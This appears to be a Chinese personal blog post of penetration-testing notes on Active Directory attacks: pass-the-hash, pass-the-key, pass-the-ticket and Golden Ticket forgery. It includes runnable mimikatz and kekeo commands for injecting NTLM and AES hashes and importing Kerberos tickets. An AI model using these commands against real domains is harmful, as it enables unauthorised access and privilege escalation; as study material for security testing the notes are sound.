<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.5.2 -->
    <script>
        window.materialVersion = "1.5.2"
        // Delete localstorage with these tags
        window.oldVersion = [
            'codestartv1',
            '1.3.4',
            '1.4.0',
            '1.4.0b1',
            '1.5.0'
        ]
    </script>

    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">


    <link rel="dns-prefetch" href="https://cdn1.lncld.net"/>


    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>












    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <!-- Title -->
    
    <title>
        
            域渗透相关 | 
        
        Sparrow&#39;s blog
    </title>

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">

    <meta name="format-detection" content="telephone=no"/>
    <meta name="description" itemprop="description" content="">
    <meta name="keywords" content=",Kerberos,笔记,域渗透,hash注入,Golden Ticket,NTDS.dit">
    <meta name="theme-color" content="#0097A7">

    <!-- Disable Fucking Bloody Baidu Tranformation -->
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.zhCN.js"></script>
        
    <![endif]-->

    <!-- Import lsloader -->
    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>

    <!-- Import queue -->
    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>

    <!-- Import CSS -->
    
        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>

        
            
                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
            
        

    

    

    <!-- Config CSS -->

<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
    overflow-x: hidden !important;
  }
  
  code {
    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }

</style>


<!-- Theme Background Related-->

    <style>
      body {
        background-color: ;
      }

      /* blog_info bottom background */
      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text {
        background-color: #fff;
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>


<!-- Import Font -->
<!-- Import Roboto -->

    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">


<!-- Import Material Icons -->


    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>




    <!-- Import jQuery -->
    
        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
    

    <!-- WebAPP Icons -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="application-name" content="Sparrow&#39;s blog">
    <meta name="msapplication-starturl" content="http://yoursite.com/2018/01/19/域滲透相关/">
    <meta name="msapplication-navbutton-color" content="#0097A7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="Sparrow&#39;s blog">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon" href="/img/favicon.png">

    <!-- Site Verification -->
    
    

    <!-- RSS -->
    

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://yoursite.com/2018/01/19/域滲透相关/">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="域渗透相关 | Sparrow&#39;s blog">
    <meta property="og:image" content="/img/favicon.png">
    <meta property="og:description" content="">
    <meta property="og:article:tag" content="Kerberos"> <meta property="og:article:tag" content="笔记"> <meta property="og:article:tag" content="域渗透"> <meta property="og:article:tag" content="hash注入"> <meta property="og:article:tag" content="Golden Ticket"> <meta property="og:article:tag" content="NTDS.dit"> 

    
        <meta property="article:published_time" content="Fri Jan 19 2018 08:10:00 GMT-0500">
        <meta property="article:modified_time" content="Mon Mar 26 2018 23:51:56 GMT-0400">
    

    <!-- The Twitter Card protocol -->
    <meta name="twitter:card" content="summary_large_image">

    <!-- Add canonical link for SEO -->
    
        <link rel="canonical" href="http://yoursite.com/2018/01/19/域滲透相关/index.html" />
    

    <!-- Structured-data for SEO -->
    
        


<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage": "http://yoursite.com/2018/01/19/域滲透相关/index.html",
    "headline": "域渗透相关",
    "datePublished": "Fri Jan 19 2018 08:10:00 GMT-0500",
    "dateModified": "Mon Mar 26 2018 23:51:56 GMT-0400",
    "author": {
        "@type": "Person",
        "name": "Sparrow",
        "image": {
            "@type": "ImageObject",
            "url": "/img/avatar.png"
        },
        "description": "Hi, nice to meet you"
    },
    "publisher": {
        "@type": "Organization",
        "name": "Sparrow&#39;s blog",
        "logo": {
            "@type":"ImageObject",
            "url": "/img/favicon.png"
        }
    },
    "keywords": ",Kerberos,笔记,域渗透,hash注入,Golden Ticket,NTDS.dit",
    "description": "",
}
</script>


    

    <!-- Analytics -->
    
    
    

    <!-- Custom Head -->
    

</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->


    <!-- Left aligned menu below button -->
    
    
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-Pass-The-Key-OverPass-the-Hash"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02. Pass The Key (OverPass-the-Hash)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-Pass-the-Ticket-票据传递攻击PtT-https-www-anquanke-com-post-id-92484-kekeo-ticket-注入"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03. Pass the Ticket (票据传递攻击PtT ,https://www.anquanke.com/post/id/92484 kekeo ticket 注入)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-Golden-Ticket-黄金票据"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x04. Golden Ticket (黄金票据)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-Silver-Ticket-白银票据"><span class="post-toc-number">5.</span> <span class="post-toc-text">5. Silver Ticket (白银票据)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><span class="post-toc-number">6.</span> <span class="post-toc-text">0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x07-Kerberoasting-Kerberoast攻击的另一种姿势"><span class="post-toc-number">7.</span> <span class="post-toc-text">0x07. Kerberoasting - Kerberoast攻击的另一种姿势</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x08-SYSVOL"><span class="post-toc-number">8.</span> <span class="post-toc-text">0x08. SYSVOL</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x09-ntds-dit-活动目录的数据库文件"><span class="post-toc-number">9.</span> <span class="post-toc-text">0x09. ntds.dit (活动目录的数据库文件)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x10-MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><span class="post-toc-number">10.</span> <span class="post-toc-text">0x10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</span></a></li></ol>
    </ul>
    




<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        
            <!-- Random Thumbnail -->
            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
            <script type="text/ls-javascript" id="post-thumbnail-script">
    var randomNum = Math.floor(Math.random() * 18 + 1);

    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
    $('.post_thumbnail-random').addClass('lazy');
</script>

        
    
            <p class="article-headline-p">
                域渗透相关
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>Sparrow</strong>
        <span>1月 19, 2018</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    

    <!-- Tags (bookmark) -->
    
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/Golden-Ticket/">Golden Ticket</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Kerberos/">Kerberos</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/NTDS-dit/">NTDS.dit</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/hash注入/">hash注入</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/域渗透/">域渗透</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/笔记/">笔记</a>
    </ul>
    

    <!-- Share -->
    
        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    
    <!-- Leancloud Views -->
        <a class="post_share-link" href="#">
            <li class="mdl-menu__item">
                <span id="/2018/01/19/域滲透相关/" class="leancloud-views_num" data-flag-title="域渗透相关">
     &nbsp;浏览量
</span>

            </li>
        </a>
    

    
        
            <!-- Busuanzi Views -->
            <a class="post_share-link" href="#">
                <li class="mdl-menu__item">
                    <span id="busuanzi_container_page_pv">
                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
                    </span>
                </li>
            </a>
        
    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=域渗透相关&url=http://yoursite.com/2018/01/19/域滲透相关/index.html&pic=http://yoursite.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=域渗透相关&url=http://yoursite.com/2018/01/19/域滲透相关/index.html&via=Sparrow" target="_blank">
            <li class="mdl-menu__item">
                分享到 Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/01/19/域滲透相关/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    
        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Sparrow&#39;s blog&title=域渗透相关&summary=&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2018/01/19/域滲透相关/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 QQ
            </li>
        </a>
    

    <!-- Share Telegram -->
    
        <a class="post_share-link" href="https://telegram.me/share/url?url=http://yoursite.com/2018/01/19/域滲透相关/index.html&text=域渗透相关" target="_blank">
            <li class="mdl-menu__item">
                分享到 Telegram
            </li>
        </a>
    
</ul>

    
</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <a id="more"></a>
<h2 id="0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><a href="#0x01-Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入" class="headerlink" title="0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )"></a>0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</h2><p>在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. </p>
<p>在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。</p>
<p>当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等)</p>
<p>他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。<br>工具: </p>
<blockquote>
<ul>
<li>Metasploit - exploit/windows/smb/psexec (XP,2003)</li>
<li>xfreerdp (2012r2 <a href="http://www.freebuf.com/articles/system/15757.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/15757.html</a> Hash传递攻击登陆Windows2012远程桌面)<br>  微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉<br>  然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。</li>
<li>hash injection : <pre><code>  mimikatz # privilege::debug
  mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe
</code></pre>  (sekurlsa::pth 中的pth 即Pass the Hash)</li>
</ul>
</blockquote>
<h2 id="0x02-Pass-The-Key-OverPass-the-Hash"><a href="#0x02-Pass-The-Key-OverPass-the-Hash" class="headerlink" title="0x02. Pass The Key (OverPass-the-Hash)"></a>0x02. Pass The Key (OverPass-the-Hash)</h2><pre><code>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash 也就失去了作用，但是可以通过pass the key的攻击方式获得权限
</code></pre><blockquote>
<ul>
<li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取用户的aes key</li>
<li>mimikatz “privilege::debug” “sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c” 注入aes key</li>
</ul>
</blockquote>
<p>若dir 查看不了服务器 (测试2008r2域服务器) :<br>查看mimikatz的相关资料发现如下信息:</p>
<blockquote>
<p>ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.<br>根据提示，尝试在系统安装补丁kb2871997后继续测试<br>安裝 : <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42765" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42765</a>     </p>
</blockquote>
<p>####之后可以用\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)<br>(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</p>
<h2 id="0x03-Pass-the-Ticket-票据传递攻击PtT-https-www-anquanke-com-post-id-92484-kekeo-ticket-注入"><a href="#0x03-Pass-the-Ticket-票据传递攻击PtT-https-www-anquanke-com-post-id-92484-kekeo-ticket-注入" class="headerlink" title="0x03. Pass the Ticket (票据传递攻击PtT ,https://www.anquanke.com/post/id/92484 kekeo ticket 注入)"></a>0x03. Pass the Ticket (票据传递攻击PtT ,<a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> kekeo ticket 注入)</h2><p><img src="/2018/01/19/域滲透相关/域渗透相关/Kerberos.png" alt="Kerberos.png"><br>与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p>
<blockquote>
<p>在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。<br>    这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。<br>    新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。<br>    这种特别的攻击方法被称为”pass-the-ticket”攻击。<br><img src="/2018/01/19/域滲透相关/域渗透相关/pass-the-ticket.png" alt="pass-the-ticket.png"></p>
</blockquote>
<p>拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket</p>
<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
<p>执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> : </p>
<blockquote>
<p>kekeo “tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”</p>
</blockquote>
<p>导入票据：</p>
<blockquote>
<p>kekeo “kerberos::ptt <a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>“</p>
</blockquote>
<p>以上3种:</p>
<blockquote>
<ul>
<li>hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。</li>
<li>凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。</li>
<li>超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。</li>
</ul>
</blockquote>
<h2 id="0x04-Golden-Ticket-黄金票据"><a href="#0x04-Golden-Ticket-黄金票据" class="headerlink" title="0x04. Golden Ticket (黄金票据)"></a>0x04. Golden Ticket (黄金票据)</h2><pre><code>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。
</code></pre><p>发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。</p>
<p>由來: </p>
<blockquote>
<p>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。<br>因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,<br>理论上讲网络上只有两方能够解密TGT: 颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。<br>这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</p>
</blockquote>
<p>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p>
<blockquote>
<ul>
<li>a. 首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。<br>  内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</li>
